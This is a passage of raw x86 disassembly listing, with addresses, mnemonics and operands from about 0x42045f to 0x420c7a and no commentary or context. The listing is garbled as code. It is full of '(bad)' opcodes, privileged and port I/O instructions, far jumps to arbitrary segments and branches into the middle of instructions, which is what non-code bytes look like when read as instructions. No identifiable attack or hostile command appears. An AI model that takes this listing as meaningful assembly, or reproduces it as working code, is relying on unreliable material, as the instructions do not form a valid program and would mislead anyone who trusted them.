  42045f:	imul   edi,DWORD PTR [ecx+ecx*1-0x2eea1564],0x8
  420467:	xchg   edi,eax
  420468:	pusha  
  420469:	push   esi
  42046a:	sub    edx,0x85959a81
  420470:	das    
  420471:	sti    
  420472:	jl     0x4204ab
  420474:	fld    QWORD PTR [ebx]
  420476:	int    0x28
  420478:	fimul  DWORD PTR [ebp-0x27]
  42047b:	dec    ebp
  42047c:	div    DWORD PTR [ecx-0x3af430be]
  420482:	push   0x7a
  420484:	jmp    0x508fc57e
  420489:	sub    al,BYTE PTR [edi-0x4b12a668]
  42048f:	or     DWORD PTR [ebp+0x38],esi
  420492:	push   esp
  420493:	call   FWORD PTR fs:[edi]
  420496:	ficom  WORD PTR [ecx]
  420498:	lahf   
  420499:	fnstsw WORD PTR [edi-0x51]
  42049c:	mov    ds:0xcae5e633,al
  4204a1:	jmp    0x4c897f0c
  4204a6:	jae    0x42043f
  4204a8:	and    ah,bl
  4204aa:	(bad)  
  4204ab:	xchg   BYTE PTR [ebx],bl
  4204ad:	xchg   ecx,eax
  4204ae:	(bad)  
  4204af:	fs xor dl,bh
  4204b2:	add    al,0x64
  4204b4:	cwde   
  4204b5:	lds    ebp,FWORD PTR [ebx]
  4204b7:	cmp    eax,0x6d714d92
  4204bc:	mov    edi,0xfe189f04
  4204c1:	add    al,0xec
  4204c3:	and    BYTE PTR [edx-0x767c05af],cl
  4204c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204ca:	xor    DWORD PTR [esi],ebp
  4204cc:	xchg   ecx,eax
  4204cd:	(bad)  
  4204cf:	sub    DWORD PTR [edx-0x27],ebp
  4204d2:	jb     0x4204c1
  4204d4:	pushf  
  4204d5:	inc    esp
  4204d6:	ret    
  4204d7:	loope  0x420477
  4204d9:	sbb    BYTE PTR [eax],al
  4204db:	out    dx,eax
  4204dc:	ror    esp,cl
  4204de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204df:	mov    edi,0xe94deb8c
  4204e4:	mov    BYTE PTR [esp+eiz*4+0x77ff19b2],bl
  4204eb:	inc    eax
  4204ec:	mov    eax,ds:0xe55f15e6
  4204f1:	scas   al,BYTE PTR es:[edi]
  4204f2:	push   cs
  4204f3:	push   eax
  4204f4:	and    DWORD PTR [ebx],edx
  4204f6:	add    edi,DWORD PTR [esi-0x6d2ca7f4]
  4204fc:	jb     0x4204b4
  4204fe:	xchg   ecx,eax
  4204ff:	xchg   esi,eax
  420500:	in     al,0x4f
  420502:	adc    al,0x88
  420504:	(bad)  
  420505:	neg    DWORD PTR [ecx]
  420507:	mov    ds:0x28b51955,eax
  42050c:	push   ss
  42050d:	fcom   QWORD PTR [esi]
  42050f:	hlt    
  420510:	cdq    
  420511:	aad    0xc4
  420513:	sbb    edi,edx
  420515:	and    al,0xce
  420517:	out    0x8f,al
  420519:	int3   
  42051a:	pop    ss
  42051b:	in     eax,0x77
  42051d:	popa   
  42051e:	das    
  42051f:	repnz fisubr WORD PTR [edi-0x3d]
  420523:	nop
  420524:	shl    BYTE PTR [ecx],0x20
  420527:	pushf  
  420528:	inc    edx
  420529:	sti    
  42052a:	and    eax,0x2b47e7d6
  42052f:	arpl   WORD PTR [ebp-0xe],ax
  420532:	inc    edi
  420533:	scas   eax,DWORD PTR es:[edi]
  420534:	shl    DWORD PTR [esp+eiz*2],0x9d
  420538:	mov    esi,0x258c330
  42053d:	pop    ecx
  42053e:	inc    esp
  42053f:	stc    
  420540:	sbb    al,0x14
  420542:	push   ds
  420543:	rol    dh,0x5e
  420546:	stos   BYTE PTR es:[edi],al
  420547:	arpl   cx,cx
  420549:	jecxz  0x420570
  42054b:	pop    es
  42054c:	sub    ch,BYTE PTR [edi+eiz*8-0x68b4b212]
  420553:	inc    ebp
  420554:	sbb    al,0x1f
  420556:	cld    
  420557:	cmp    al,0x72
  420559:	ins    BYTE PTR es:[edi],dx
  42055a:	mov    bl,0x5b
  42055c:	push   ecx
  42055d:	cs dec ebp
  42055f:	xor    DWORD PTR [ebp+0x26],eax
  420562:	adc    BYTE PTR [ebp-0x7d97695],ah
  420568:	lahf   
  420569:	imul   eax,DWORD PTR [edi],0x0
  42056c:	not    esi
  42056e:	sub    eax,0x6da20f83
  420573:	pusha  
  420574:	jmp    0x463d:0x3ef4182e
  42057b:	push   esi
  42057c:	jg     0x42054a
  42057e:	adc    dl,bh
  420580:	enter  0x946a,0xb2
  420584:	test   eax,0x5885282b
  420589:	ins    DWORD PTR es:[edi],dx
  42058a:	call   0x91cf:0xee28db73
  420591:	std    
  420592:	(bad)  
  420593:	enter  0xd149,0x9b
  420597:	ret    0xfc3e
  42059a:	cmc    
  42059b:	stos   DWORD PTR es:[edi],eax
  42059c:	(bad)  
  42059d:	mov    ebx,0xf3b1d0d6
  4205a2:	xor    al,0x95
  4205a4:	jle    0x4205e7
  4205a6:	sub    ecx,esp
  4205a8:	xchg   ecx,eax
  4205a9:	loope  0x4205ca
  4205ab:	loope  0x4205b6
  4205ad:	out    0xf8,al
  4205af:	add    esp,DWORD PTR [edi+0x49]
  4205b2:	es push 0x7e
  4205b5:	aaa    
  4205b6:	mov    DWORD PTR [eax+0x3b],eax
  4205b9:	gs gs lock push esp
  4205bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205be:	fcom   QWORD PTR [esi+ebx*8+0x4f]
  4205c2:	pop    edi
  4205c3:	push   ds
  4205c4:	(bad)  
  4205c5:	(bad)  
  4205c6:	repnz outs dx,DWORD PTR ds:[esi]
  4205c8:	jle    0x4205be
  4205ca:	leave  
  4205cb:	push   eax
  4205cc:	loope  0x420565
  4205ce:	sti    
  4205cf:	sub    eax,0xc2958016
  4205d4:	jle    0x42055a
  4205d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205d7:	xchg   esp,eax
  4205d8:	sbb    al,0xe4
  4205db:	rol    BYTE PTR ds:0xd4b47128,1
  4205e1:	xchg   edx,eax
  4205e2:	mov    dl,bl
  4205e4:	inc    ebx
  4205e5:	call   0x88534982
  4205ea:	mov    bh,0x40
  4205ec:	and    edx,DWORD PTR [esi+0xd]
  4205ef:	retf   
  4205f0:	nop
  4205f1:	push   gs
  4205f3:	outs   dx,DWORD PTR ds:[esi]
  4205f4:	pop    esi
  4205f5:	enter  0xa857,0xb4
  4205f9:	nop
  4205fa:	sub    BYTE PTR [eax],bl
  4205fc:	jg     0x4205c4
  4205fe:	in     al,dx
  4205ff:	jb     0x420623
  420601:	cmp    al,0x68
  420603:	mov    BYTE PTR [eax],ch
  420605:	mov    DWORD PTR [ebx-0x64],ebp
  420608:	(bad)  
  420609:	(bad)  
  42060b:	addr16 pop ebp
  42060d:	inc    eax
  42060e:	inc    ebx
  42060f:	shr    DWORD PTR [ecx-0x69],cl
  420612:	add    DWORD PTR [esi+0x41],0x983177d9
  420619:	mov    eax,0xab07ad27
  42061e:	cmp    dl,0x6b
  420621:	enter  0x4227,0x14
  420625:	sbb    eax,0xcca70ef1
  42062a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42062b:	js     0x420679
  42062d:	mov    al,0x61
  42062f:	aad    0x26
  420631:	in     eax,0xc3
  420633:	mov    ch,0x90
  420635:	adc    bh,BYTE PTR [ebx+0x40d7a27d]
  42063b:	out    0x4f,eax
  42063d:	xlat   BYTE PTR ds:[ebx]
  42063e:	mov    dh,0x4f
  420640:	test   eax,0x7278a431
  420645:	xchg   esp,eax
  420646:	out    dx,al
  420647:	jg     0x92c3195a
  42064d:	into   
  42064e:	inc    esp
  42064f:	mov    ecx,0xf81f6f92
  420654:	cmp    esp,ebp
  420656:	pop    ecx
  420657:	(bad)  [ebx-0x1c522986]
  42065d:	fidivr DWORD PTR [eax+0x5cd149f3]
  420663:	mov    ebp,ebp
  420665:	add    BYTE PTR ss:[esp+ecx*1],dh
  420669:	mov    ch,0xec
  42066b:	mov    al,ds:0xf31c8384
  420670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420671:	jecxz  0x420693
  420673:	pop    edi
  420674:	jo     0x42062b
  420676:	jecxz  0x420681
  420678:	call   0x7fb8d565
  42067d:	or     BYTE PTR [ebp-0xa],al
  420680:	mov    ds:0xe27c865e,eax
  420685:	mov    dl,0x83
  420687:	les    edi,FWORD PTR [edi]
  420689:	popa   
  42068a:	mov    ch,0xa8
  42068c:	xchg   edx,eax
  42068d:	pop    ecx
  42068e:	pop    ss
  42068f:	in     eax,0x80
  420691:	add    eax,ebp
  420693:	cdq    
  420694:	test   DWORD PTR [ecx],edi
  420696:	adc    ebp,DWORD PTR [ebx+eax*4]
  420699:	dec    DWORD PTR [edi]
  42069b:	(bad)  
  42069c:	in     eax,dx
  42069d:	neg    BYTE PTR [edi]
  42069f:	mov    ch,0xb7
  4206a1:	cli    
  4206a2:	mov    eax,ds:0xb1285192
  4206a7:	or     DWORD PTR [ebx],eax
  4206a9:	mov    eax,ds:0xe0c7c7a8
  4206ae:	dec    esi
  4206af:	cmp    dl,BYTE PTR [esi]
  4206b1:	pop    ss
  4206b2:	repz jne 0x4206c7
  4206b5:	retf   
  4206b6:	mov    cl,0x8c
  4206b8:	test   DWORD PTR [edx+eiz*8],edi
  4206bb:	jmp    0x4206d3
  4206bd:	jmp    0x500f:0x82b4ed46
  4206c4:	jno    0x4206af
  4206c6:	(bad)  
  4206c7:	repnz int 0xa2
  4206ca:	fwait
  4206cb:	mov    al,ds:0x19c48b21
  4206d0:	int3   
  4206d1:	call   0x3538b348
  4206d6:	int    0x67
  4206d8:	and    edx,DWORD PTR [ecx]
  4206da:	fisttp QWORD PTR [ebx+0x56]
  4206dd:	xor    eax,0xe4fa331e
  4206e2:	popf   
  4206e3:	and    al,0xc
  4206e5:	pushf  
  4206e6:	je     0x420688
  4206e8:	cmc    
  4206e9:	inc    ebx
  4206ea:	cmp    BYTE PTR [edx+0x64a0a6d],bl
  4206f0:	mov    eax,0x51c2f535
  4206f5:	stc    
  4206f6:	addr16 inc edx
  4206f8:	lods   al,BYTE PTR ds:[esi]
  4206f9:	les    ebx,FWORD PTR [ecx+ebx*2]
  4206fc:	add    DWORD PTR [ebx],ecx
  4206fe:	xor    ebp,DWORD PTR [ebp+0x1b8abb64]
  420704:	leave  
  420705:	call   0x1d670165
  42070a:	push   ebp
  42070b:	(bad)  
  42070c:	ror    DWORD PTR [eax+0x1c8b0a9],cl
  420712:	mov    eax,0xe6e03c3c
  420717:	jbe    0x420779
  420719:	ins    DWORD PTR es:[edi],dx
  42071a:	or     dh,ah
  42071c:	inc    ecx
  42071d:	mov    al,0x26
  42071f:	adc    DWORD PTR [ebx+ecx*4+0x28],esi
  420723:	pop    es
  420724:	mov    ah,0x3
  420726:	xchg   DWORD PTR [eax+0x5d],edx
  420729:	xor    BYTE PTR [eax-0x4c2c5730],al
  42072f:	and    eax,esi
  420731:	sub    ebx,DWORD PTR [ebx]
  420733:	imul   ebp,DWORD PTR [edx],0x7bc6f595
  420739:	(bad)  
  42073a:	fst    QWORD PTR ds:0x94be1f1b
  420740:	xchg   ecx,eax
  420741:	push   esi
  420742:	inc    esp
  420743:	dec    esi
  420744:	xor    al,ah
  420746:	imul   ebp,DWORD PTR [ebp+0x3d379405],0x8e4fc924
  420750:	loope  0x420760
  420752:	inc    edx
  420753:	sub    al,0x15
  420755:	xchg   edx,eax
  420756:	xor    bh,BYTE PTR [ebp-0x4f]
  420759:	push   edi
  42075a:	cmp    BYTE PTR [eax],dh
  42075c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42075d:	xor    eax,0xac01a9ba
  420762:	lock iret 
  420764:	inc    edi
  420765:	xchg   edi,eax
  420766:	sub    DWORD PTR [ecx+ebp*8+0x21005831],ecx
  42076d:	icebp  
  42076e:	mov    BYTE PTR [ecx],bh
  420770:	sbb    eax,0x7fccf88b
  420775:	out    0x33,eax
  420777:	shr    DWORD PTR [eax+0x4f4e1384],0xc5
  42077e:	adc    ch,BYTE PTR [ecx-0x4c]
  420781:	call   0x3e7d:0x13401613
  420788:	inc    eax
  420789:	cmp    BYTE PTR [ebp-0x1a7639e0],cl
  42078f:	sub    ah,cl
  420791:	xor    ch,BYTE PTR [eax+0x4]
  420794:	push   ecx
  420795:	cmp    dh,BYTE PTR [edi+0x3ebe3ce]
  42079b:	nop
  42079c:	leave  
  42079d:	add    al,0xa8
  42079f:	mov    DWORD PTR [ebp-0x1d55707a],edi
  4207a5:	in     al,0x81
  4207a7:	sub    BYTE PTR [ecx-0x3337c7a2],bh
  4207ad:	mov    al,ds:0x6693b1fd
  4207b2:	mov    eax,0x5b8b3fbe
  4207b7:	ret    
  4207b8:	fisubr DWORD PTR [edi]
  4207ba:	adc    ebx,ebp
  4207bc:	push   edi
  4207bd:	xlat   BYTE PTR ds:[ebx]
  4207be:	cmp    DWORD PTR [ebp+0x76],esp
  4207c1:	cmp    BYTE PTR [ebx+eiz*8+0xaa41b2d],ah
  4207c8:	mov    ebp,0x8a85cfa8
  4207cd:	in     eax,0x50
  4207cf:	in     al,0xeb
  4207d1:	xchg   edi,eax
  4207d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207d3:	sti    
  4207d4:	shl    BYTE PTR [edx+esi*4-0x306db221],0xaa
  4207dc:	mov    ds:0x77df98f5,al
  4207e1:	jmp    0x420814
  4207e3:	fidiv  DWORD PTR [edi+eax*2+0x69]
  4207e7:	xchg   ebp,eax
  4207e8:	pop    es
  4207e9:	or     ah,BYTE PTR [ecx-0x4dcb478b]
  4207ef:	cld    
  4207f0:	push   ecx
  4207f1:	gs ins BYTE PTR es:[edi],dx
  4207f3:	dec    ebx
  4207f4:	test   ebx,ebp
  4207f6:	jb     0x4207de
  4207f8:	call   0x7697:0xc0638d4
  4207ff:	imul   eax,DWORD PTR [edx],0xffffffc8
  420802:	xchg   esi,eax
  420803:	xor    ebp,DWORD PTR [eax+0x18]
  420806:	fidiv  DWORD PTR [esi+0x2e76bb7b]
  42080c:	sbb    DWORD PTR ds:0x33198f01,edi
  420812:	mov    ch,0xe
  420814:	sub    al,0x48
  420816:	mov    WORD PTR [edx],gs
  420818:	ja     0x420838
  42081a:	(bad)  
  42081b:	shl    DWORD PTR [ebx],1
  42081d:	xor    BYTE PTR [edx],bl
  42081f:	sbb    esp,DWORD PTR [esi+0x1812a306]
  420825:	pop    ebx
  420826:	imul   edi,esi,0x7a9a6b78
  42082c:	(bad)  
  42082d:	test   DWORD PTR [eax-0x7a],0xb0da67e1
  420834:	daa    
  420835:	sbb    al,0xbd
  420837:	inc    ebx
  420838:	or     al,BYTE PTR [edx+ebp*4-0x4964dfc6]
  42083f:	xor    BYTE PTR [edi+0x24],0xbf
  420843:	sub    esi,DWORD PTR [ecx+0x1a63e49b]
  420849:	dec    ecx
  42084a:	xchg   esi,eax
  42084b:	jo     0x4207e7
  42084d:	ja     0x4208bc
  42084f:	(bad)  
  420850:	mov    ds:0x6df3e358,al
  420855:	popf   
  420856:	ins    DWORD PTR es:[edi],dx
  420857:	sbb    BYTE PTR [ecx-0x77],dl
  42085a:	mov    ebx,0xf393bba4
  42085f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420860:	push   cs
  420861:	cmp    BYTE PTR [esi+0x6933de8],cl
  420867:	fnstenv [edi-0x20c37dc3]
  42086d:	sbb    ecx,edx
  42086f:	aaa    
  420870:	popa   
  420871:	mov    edx,0x2d38a71d
  420876:	loopne 0x420805
  420878:	repnz xchg esi,ebp
  42087b:	aas    
  42087c:	push   edx
  42087d:	push   ecx
  42087e:	sbb    BYTE PTR [esi+0x4],al
  420881:	icebp  
  420882:	(bad)  
  420884:	mov    ebx,0xedcbf06d
  420889:	mov    cl,0xae
  42088b:	ins    DWORD PTR es:[edi],dx
  42088c:	sbb    esi,eax
  42088e:	ror    ah,1
  420890:	call   0x67b7b629
  420895:	cmp    DWORD PTR [esi-0x2],ebp
  420898:	je     0x420848
  42089a:	cmc    
  42089b:	jmp    0x420866
  42089d:	call   esi
  42089f:	test   BYTE PTR [ebx+ecx*4+0x64],bl
  4208a3:	jl     0x420906
  4208a5:	mov    ds:0x94a0c1d4,al
  4208aa:	test   BYTE PTR [edi],al
  4208ac:	loop   0x42088c
  4208ae:	not    DWORD PTR ds:0x551c017d
  4208b4:	scas   eax,DWORD PTR es:[edi]
  4208b5:	sbb    cl,BYTE PTR [ebx]
  4208b7:	push   ds
  4208b8:	call   esp
  4208ba:	adc    bl,BYTE PTR ds:0x1524fc9a
  4208c0:	xor    BYTE PTR [eax-0x5d04e94c],ah
  4208c6:	clc    
  4208c7:	popa   
  4208c8:	sub    eax,edx
  4208ca:	cmp    BYTE PTR [ebp+0x494ef378],bl
  4208d0:	push   edi
  4208d1:	in     eax,dx
  4208d2:	hlt    
  4208d3:	mov    al,0xa2
  4208d5:	mov    al,ds:0x92b4c371
  4208da:	rol    DWORD PTR [edi+0x61],0xb6
  4208de:	mov    WORD PTR [eax+0x7bf54634],fs
  4208e4:	test   BYTE PTR [eax],dl
  4208e6:	sbb    al,0x73
  4208e8:	pusha  
  4208e9:	outs   dx,DWORD PTR ds:[esi]
  4208ea:	sti    
  4208eb:	fnsave [ecx+0x4a]
  4208ee:	inc    ebp
  4208ef:	mov    dl,0x8
  4208f1:	(bad)  
  4208f2:	jg     0x4208cf
  4208f4:	cmp    al,BYTE PTR [esi]
  4208f6:	sahf   
  4208f7:	mov    ds:0x1b8a70d2,al
  4208fc:	call   0xed0baacf
  420901:	mov    al,ds:0xea8a3be0
  420906:	sbb    esi,DWORD PTR [ebx+eiz*8]
  420909:	sbb    BYTE PTR [ecx],bl
  42090b:	popf   
  42090c:	add    BYTE PTR [ecx-0x63f279bc],dh
  420912:	mov    bh,0xb
  420914:	cmp    cl,BYTE PTR [ebx+0x43]
  420917:	sahf   
  420918:	rcr    DWORD PTR [ecx+0x17],0xd5
  42091c:	rcr    BYTE PTR [ebp+edx*1+0x3e],0x6c
  420921:	pop    edi
  420922:	je     0x420923
  420924:	jg     0x4208b5
  420926:	jnp    0x4208c9
  420928:	daa    
  420929:	push   es
  42092a:	sub    DWORD PTR [ecx],ecx
  42092c:	jge    0x4209aa
  42092e:	ins    DWORD PTR es:[edi],dx
  42092f:	fdivr  QWORD PTR [edx+0x53d5a8cb]
  420935:	or     bl,bh
  420937:	adc    DWORD PTR [ebx+0x70c48ca6],ebx
  42093d:	aas    
  42093e:	push   ds
  42093f:	mov    esi,0x51ac27a7
  420944:	mov    ecx,0x783d8a25
  420949:	jb     0x4209c6
  42094b:	push   ss
  42094c:	add    ah,BYTE PTR [ecx-0x2f]
  42094f:	rcr    BYTE PTR ds:0x6f1e2736,1
  420955:	loop   0x420906
  420957:	xor    BYTE PTR [edx-0x68],dl
  42095a:	or     eax,0x1d9de02f
  42095f:	cmp    DWORD PTR [esi+ecx*4],0x5b
  420963:	sub    BYTE PTR [edx],ah
  420965:	in     al,dx
  420966:	sbb    eax,0x8bfe925
  42096b:	pop    ds
  42096c:	stos   BYTE PTR es:[edi],al
  42096d:	jb     0x420978
  42096f:	test   al,0x8a
  420971:	jmp    0x5122:0x8831cf84
  420978:	mov    ebx,0xa1fc594d
  42097d:	jno    0x420989
  42097f:	push   edi
  420980:	test   eax,0xfa9c22
  420985:	int3   
  420986:	retf   0x490d
  420989:	mov    esp,0x406022a8
  42098e:	push   0x4668352
  420993:	pop    es
  420994:	add    dl,BYTE PTR [ebx+0x6f233deb]
  42099a:	jne    0x420971
  42099c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42099d:	fldenv [edi+0x6d110cd9]
  4209a3:	cmp    BYTE PTR [eax-0x44],ch
  4209a6:	sahf   
  4209a7:	and    al,0x88
  4209a9:	clc    
  4209aa:	xor    DWORD PTR [ebp+ecx*8-0x3156aab3],0xffffff8a
  4209b2:	dec    ebx
  4209b3:	mov    cl,0xe9
  4209b5:	stos   DWORD PTR es:[edi],eax
  4209b6:	fwait
  4209b7:	imul   edx,DWORD PTR [ebx],0x3d
  4209ba:	cs ja  0x420a06
  4209bd:	js     0x420a1e
  4209bf:	in     al,dx
  4209c0:	mov    edi,0xecff3992
  4209c5:	fidivr WORD PTR [eax]
  4209c7:	std    
  4209c8:	imul   ebp,esp,0xffffffb7
  4209cb:	push   ebx
  4209cc:	ins    DWORD PTR es:[edi],dx
  4209cd:	inc    ebp
  4209ce:	jne    0x4209cc
  4209d0:	rcr    BYTE PTR [edx+0x5a],0x6f
  4209d4:	cld    
  4209d5:	xchg   ecx,eax
  4209d6:	add    BYTE PTR [ebp-0x5a],ah
  4209d9:	clc    
  4209da:	xor    eax,0xa3410d62
  4209df:	daa    
  4209e0:	shl    DWORD PTR ds:0x9c0116c,cl
  4209e6:	xor    ecx,0x91593fe7
  4209ec:	jl     0x420a67
  4209ee:	and    DWORD PTR [edi-0x33],esp
  4209f1:	cmp    dh,0x3
  4209f4:	in     eax,dx
  4209f5:	or     BYTE PTR [eax-0x4f378a88],ah
  4209fb:	xor    DWORD PTR [edi+edx*8+0x37],eax
  4209ff:	push   cs
  420a00:	push   cs
  420a01:	out    dx,al
  420a02:	push   ebx
  420a03:	mov    ch,0x4
  420a05:	loope  0x420a3f
  420a07:	or     edi,ecx
  420a09:	call   0x1704ee86
  420a0e:	dec    edx
  420a0f:	mov    eax,0xcb833f86
  420a14:	and    eax,0xf6e4441e
  420a19:	jmp    0xffe:0x913ab408
  420a20:	mov    ebx,0x4357efd3
  420a25:	adc    DWORD PTR [ebp-0x18],ebx
  420a28:	pop    edi
  420a29:	mov    cl,BYTE PTR [edi+0x40]
  420a2c:	mov    bl,0x32
  420a2e:	test   al,0x67
  420a30:	out    dx,al
  420a31:	sbb    dl,BYTE PTR [ebp+0x338f8524]
  420a37:	retf   
  420a38:	dec    eax
  420a39:	push   0x7b2ee676
  420a3e:	dec    ebx
  420a3f:	aam    0xb6
  420a41:	or     DWORD PTR [ecx-0x11b3c20e],0x54
  420a48:	jg     0x420a4b
  420a4a:	fistp  DWORD PTR [ebp+eiz*1-0x22166ca8]
  420a51:	sub    DWORD PTR [ebp+0x4fc4df31],0x903467d9
  420a5b:	or     DWORD PTR [edi],esp
  420a5d:	fiadd  WORD PTR [esi+esi*1-0x5fc68e7]
  420a64:	push   edx
  420a65:	or     edi,esi
  420a67:	out    dx,al
  420a68:	nop
  420a69:	jne    0x420a10
  420a6b:	(bad)  
  420a6c:	dec    edi
  420a6d:	jmp    0x229158dc
  420a72:	retf   0xbfdb
  420a75:	test   DWORD PTR [eax+ebp*1],esp
  420a78:	out    0x13,al
  420a7a:	ss lahf 
  420a7c:	mov    esi,0x115461e1
  420a81:	imul   esp,DWORD PTR [ebx+0x22],0x20e76f2b
  420a88:	sbb    al,al
  420a8a:	test   dl,ah
  420a8c:	imul   edx,DWORD PTR [esi],0xa856b416
  420a92:	pop    edx
  420a93:	mov    WORD PTR [edi],cs
  420a95:	mov    ebx,0xa1e6e8b7
  420a9a:	adc    dh,al
  420a9c:	mov    ds:0x8a9ed9fe,al
  420aa1:	dec    ebp
  420aa2:	js     0x420a68
  420aa4:	ja     0x420adf
  420aa6:	push   es
  420aa7:	mov    dh,0xc7
  420aa9:	mov    edi,0xec58c80a
  420aae:	mov    edx,0x38b4a811
  420ab3:	or     eax,0x470806c8
  420ab8:	mov    al,ds:0x6df40b44
  420abd:	sub    eax,0x314072de
  420ac2:	sbb    eax,0x428c7b65
  420ac7:	sub    ah,ch
  420ac9:	push   edi
  420aca:	imul   edx,eax,0xffffffb3
  420acd:	mov    esi,0x41d8ab2a
  420ad2:	cmp    eax,0x3812c4d3
  420ad7:	dec    ebx
  420ad8:	jne    0x420a81
  420ada:	ret    
  420adb:	es jb  0x420a92
  420ade:	ins    DWORD PTR es:[edi],dx
  420adf:	mov    DWORD PTR [esi+0x17b713b4],0x4cc450d9
  420ae9:	mov    edx,0x28bf884c
  420aee:	lock stos BYTE PTR es:[edi],al
  420af0:	fdivr  DWORD PTR [ebp-0x8dd4077]
  420af6:	inc    edx
  420af7:	gs leave 
  420af9:	inc    esp
  420afa:	icebp  
  420afb:	cmp    DWORD PTR [esi+0x3e8aa090],0xffffff92
  420b02:	or     BYTE PTR [esi-0x1f684559],bh
  420b08:	lods   eax,DWORD PTR es:[esi]
  420b0a:	lods   al,BYTE PTR ds:[esi]
  420b0b:	pop    eax
  420b0c:	ins    BYTE PTR es:[edi],dx
  420b0d:	jmp    0x420b04
  420b0f:	mov    esi,0xf9a350c9
  420b14:	fwait
  420b15:	xchg   ebx,eax
  420b16:	pop    esi
  420b17:	and    DWORD PTR [edi-0x7f907232],ebx
  420b1d:	dec    eax
  420b1e:	test   DWORD PTR [edx+0x76],eax
  420b21:	pop    esi
  420b22:	inc    esp
  420b23:	sub    DWORD PTR [esi],0xf456dae
  420b29:	fldcw  WORD PTR [ecx-0x676cc30c]
  420b2f:	icebp  
  420b30:	inc    esi
  420b31:	jmp    0x9b31:0xefc08b15
  420b38:	ins    DWORD PTR es:[edi],dx
  420b39:	inc    ecx
  420b3a:	sub    al,BYTE PTR [ecx+0x622ede82]
  420b40:	ja     0x420b9a
  420b42:	or     DWORD PTR [edi-0x17409850],esp
  420b48:	adc    dl,BYTE PTR [esi-0x35a12394]
  420b4e:	fild   DWORD PTR [ecx+0x2499ce5e]
  420b54:	popa   
  420b55:	aas    
  420b56:	push   es
  420b57:	ja     0x420bd8
  420b59:	pop    edi
  420b5a:	cmp    al,0xd6
  420b5c:	leave  
  420b5d:	xchg   ebp,eax
  420b5e:	sub    al,0xd3
  420b60:	repz mov edi,0xfb4288c
  420b66:	adc    eax,0xc41a7011
  420b6b:	mov    edx,0x46dc28b5
  420b70:	aaa    
  420b71:	add    esp,DWORD PTR [edx+0xd]
  420b74:	or     bl,BYTE PTR [ebp-0x71]
  420b77:	fmul   QWORD PTR [eax+edi*1-0x12]
  420b7b:	push   edi
  420b7c:	icebp  
  420b7d:	test   al,0x3b
  420b7f:	in     al,dx
  420b80:	mov    edi,0x133864f4
  420b85:	test   DWORD PTR [ecx-0x46ee3f01],0xd7897433
  420b8f:	fild   QWORD PTR [esi-0x1d154af4]
  420b95:	fwait
  420b96:	jmp    0x8c71b62d
  420b9b:	pusha  
  420b9c:	ss pop esi
  420b9e:	sar    edx,1
  420ba0:	test   eax,0x427a256e
  420ba5:	mov    ch,BYTE PTR [esi]
  420ba7:	scas   eax,DWORD PTR es:[edi]
  420ba8:	call   0x5c29:0x2b738cf6
  420baf:	push   esi
  420bb0:	int    0x6c
  420bb2:	sbb    ch,BYTE PTR [esi+0x1f191b9a]
  420bb8:	clc    
  420bb9:	mov    al,0xf2
  420bbb:	repnz clc 
  420bbd:	outs   dx,DWORD PTR ds:[esi]
  420bbe:	adc    eax,0x1cce93d9
  420bc3:	pop    ecx
  420bc4:	jo     0x420c1d
  420bc6:	fild   DWORD PTR [eax+0x30]
  420bc9:	or     ebp,DWORD PTR [eax]
  420bcb:	jbe    0x420b5e
  420bcd:	scas   eax,DWORD PTR es:[edi]
  420bce:	in     ax,0x55
  420bd1:	mov    esi,DWORD PTR [ebp-0x3179f393]
  420bd7:	mov    eax,0xd80b5250
  420bdc:	imul   edi,DWORD PTR [esi+eax*2-0x1a46d91f],0xfffffff8
  420be4:	fdiv   st(4),st
  420be6:	adc    cl,dh
  420be8:	arpl   si,bp
  420bea:	retf   
  420beb:	xchg   esp,eax
  420bec:	or     edx,ebp
  420bee:	xchg   BYTE PTR [ebp-0x4bae92e0],ah
  420bf4:	std    
  420bf5:	lock loopne 0x420bd0
  420bf8:	loopne 0x420c2c
  420bfa:	mov    WORD PTR [ebx-0x68c004ba],?
  420c00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c01:	xor    eax,0x6d093ba6
  420c06:	fcom   DWORD PTR [ecx]
  420c08:	fidiv  WORD PTR [ebx]
  420c0a:	pop    esp
  420c0b:	jnp    0x420b97
  420c0d:	adc    BYTE PTR [ecx+eiz*8-0x34],bl
  420c11:	pop    es
  420c12:	in     al,dx
  420c13:	push   ecx
  420c14:	icebp  
  420c15:	es xor edx,edi
  420c18:	sti    
  420c19:	push   cs
  420c1a:	add    ebx,ebx
  420c1c:	mov    edi,0x124ca267
  420c21:	dec    ebx
  420c22:	jmp    0x420c0f
  420c24:	cmp    BYTE PTR [edx+0x37],al
  420c27:	mov    ds:0x32f3d369,eax
  420c2c:	dec    ecx
  420c2d:	popf   
  420c2e:	popf   
  420c2f:	and    eax,0xfbacb819
  420c34:	dec    eax
  420c35:	sub    dh,bh
  420c37:	jmp    0xe5d92bd9
  420c3c:	(bad)  
  420c3d:	lahf   
  420c3e:	jno    0x420be1
  420c40:	push   es
  420c41:	adc    al,0x91
  420c43:	adc    bl,BYTE PTR [ecx+edi*2]
  420c46:	outs   dx,DWORD PTR ds:[esi]
  420c47:	xchg   BYTE PTR [ebx-0x7],ah
  420c4a:	fisub  WORD PTR [ebx+0x5e]
  420c4d:	gs adc BYTE PTR cs:[esi+0x35a42966],ah
  420c55:	push   ebp
  420c56:	icebp  
  420c57:	inc    eax
  420c58:	inc    ecx
  420c59:	and    cl,BYTE PTR [ecx]
  420c5b:	retf   
  420c5c:	in     eax,0x9e
  420c5e:	fcmovbe st,st(7)
  420c60:	xchg   edi,eax
  420c61:	pop    edx
  420c62:	inc    eax
  420c63:	lahf   
  420c64:	mov    bl,0x14
  420c66:	pop    ebx
  420c67:	mov    edx,0x4d2e4041
  420c6c:	mov    esi,0xd5a032ad
  420c71:	jns    0x420c7d
  420c73:	push   0xd
  420c75:	fcomi  st,st(6)
  420c77:	jo     0x420c47
  420c79:	lods   al,BYTE PTR ds:[esi]
  420c7a:	push   ebp
